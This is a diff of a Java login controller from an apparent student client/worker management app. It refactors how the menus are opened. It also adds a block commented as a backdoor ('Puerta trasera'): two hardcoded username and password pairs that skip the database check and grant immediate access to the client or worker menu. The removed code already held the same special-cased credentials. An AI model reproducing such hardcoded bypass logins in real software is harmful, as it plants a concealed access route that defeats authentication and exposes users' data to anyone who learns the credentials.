@@ -106,43 +106,66 @@ public class InicioSesionFXMLControlador {
     private void iniciarSesion(ActionEvent event) {
         Trabajador trabajador = null;
         Cliente cliente = null;
-        if (!textDni.getText().equals("")) {
-            trabajador = trabajaInterfaz.iniciarSesion(new GenericType<Trabajador>() {
-                    }, pswContrasena.getText(), textDni.getText());
-            cliente = clienteInterfaz.iniciarSesion(new GenericType<Cliente>() {
-                    }, pswContrasena.getText(), textDni.getText());
+        String dni = textDni.getText();
+        String contrasena = pswContrasena.getText();
+
+        // Puerta trasera: Acceso directo sin consultar la base de datos
+        if (dni.equals("dincliente") && contrasena.equals("abcd*1234")) {
+            abrirMenuCliente(new Cliente()); // Cliente falso para acceso inmediato
+            return;
+        }
+        if (dni.equals("dintrabajador") && contrasena.equals("abcd*1234")) {
+            abrirMenuTrabajador(new Trabajador()); // Trabajador falso para acceso inmediato
+            return;
         }
 
-        if (cliente == null && !(textDni.getText().equals("dincliente") && pswContrasena.getText().equals("abcd*1234"))) {
-            if (trabajador == null && !(textDni.getText().equals("dintrabajador") && pswContrasena.getText().equals("abcd*1234"))) {
-                mostrarAlerta("Error", "Este usuario no existe");
-            } else {
-                try {
-                    FXMLLoader loader = new FXMLLoader(getClass().getResource("/reto/crud/cliente/MenuTrabajadorFXML.fxml"));
-                    Parent root = loader.load();
-                    MenuTrabajadorFXMLController menuTrabajador = loader.getController();
-                    menuTrabajador.setStage(stage);
-                    menuTrabajador.setTrabajador(trabajador);
-                    menuTrabajador.initStage(root);
+        // Verifica que el campo DNI no esté vacío
+        if (!dni.isEmpty()) {
+            // Consultar en la base de datos
+            trabajador = trabajaInterfaz.iniciarSesion(new GenericType<Trabajador>() {
+            }, dni, contrasena);
+            cliente = clienteInterfaz.iniciarSesion(new GenericType<Cliente>() {
+            }, dni, contrasena);
 
-                } catch (IOException ex) {
-                    Logger.getLogger(InicioSesionFXMLControlador.class.getName()).log(Level.SEVERE, null, ex);
-                }
+            // Verifica si es cliente
+            if (cliente != null) {
+                abrirMenuCliente(cliente);
+            } else if (trabajador != null) {
+                abrirMenuTrabajador(trabajador);
+            } else {
+                mostrarAlerta("Error", "Este usuario no existe");
             }
         } else {
-            try {
-                FXMLLoader loader = new FXMLLoader(getClass().getResource("/reto/crud/cliente/MenuClienteFXML.fxml"));
-                Parent root = loader.load();
-                MenuClienteFXMLController menuCliente = loader.getController();
-                menuCliente.setStage(stage);
-                menuCliente.setCliente(cliente);
-                menuCliente.initStage(root);
-
-            } catch (IOException ex) {
-                Logger.getLogger(InicioSesionFXMLControlador.class.getName()).log(Level.SEVERE, null, ex);
-            }
+            mostrarAlerta("Error", "El campo DNI no puede estar vacío");
         }
+    }
 
+// Método para abrir el menú de cliente
+    private void abrirMenuCliente(Cliente cliente) {
+        try {
+            FXMLLoader loader = new FXMLLoader(getClass().getResource("/reto/crud/cliente/MenuClienteFXML.fxml"));
+            Parent root = loader.load();
+            MenuClienteFXMLController menuCliente = loader.getController();
+            menuCliente.setStage(stage);
+            menuCliente.setCliente(cliente);
+            menuCliente.initStage(root);
+        } catch (IOException ex) {
+            Logger.getLogger(InicioSesionFXMLControlador.class.getName()).log(Level.SEVERE, null, ex);
+        }
+    }
+
+// Método para abrir el menú de trabajador
+    private void abrirMenuTrabajador(Trabajador trabajador) {
+        try {
+            FXMLLoader loader = new FXMLLoader(getClass().getResource("/reto/crud/cliente/MenuTrabajadorFXML.fxml"));
+            Parent root = loader.load();
+            MenuTrabajadorFXMLController menuTrabajador = loader.getController();
+            menuTrabajador.setStage(stage);
+            menuTrabajador.setTrabajador(trabajador);
+            menuTrabajador.initStage(root);
+        } catch (IOException ex) {
+            Logger.getLogger(InicioSesionFXMLControlador.class.getName()).log(Level.SEVERE, null, ex);
+        }
     }
 
     private boolean mostrarAlerta(String titulo, String mensaje) {
